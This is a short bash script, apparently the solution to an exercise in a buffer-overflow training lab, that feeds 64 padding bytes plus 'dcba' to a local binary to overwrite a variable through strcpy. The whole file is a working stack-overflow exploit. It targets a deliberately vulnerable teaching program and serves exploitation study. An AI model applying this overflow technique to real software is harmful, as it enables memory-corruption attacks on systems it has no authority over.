#!/usr/bin/env bash
# ex01 — strcpy(argv[1]) overflow to set modified == 0x61626364
# 64 bytes of padding fill the buffer; the next 4 bytes ("dcba") land on
# modified. Little-endian: 0x61626364 stored as bytes 64 63 62 61 = "dcba".

set -e
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
BIN="$SCRIPT_DIR/bin"

[[ -x "$BIN" ]] || { echo "[!] binary not found: $BIN"; exit 1; }

echo "[*] ex01 — overflow modified to 0x61626364 via strcpy(argv[1])"
echo ""

"$BIN" "$(python3 -c "print('A'*64 + 'dcba', end='')")"

echo ""
echo "[*] done."
